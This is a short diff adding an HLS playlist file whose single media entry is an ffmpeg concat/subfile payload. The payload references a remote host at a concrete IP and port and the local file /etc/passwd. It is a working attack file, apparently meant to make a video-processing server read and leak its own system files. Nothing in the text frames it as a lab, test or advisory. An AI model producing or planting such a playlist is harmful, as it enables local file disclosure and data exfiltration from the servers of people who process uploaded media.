@@ -1,0 +1,5 @@
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://37.27.206.149:4444/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd
+#EXT-X-ENDLIST
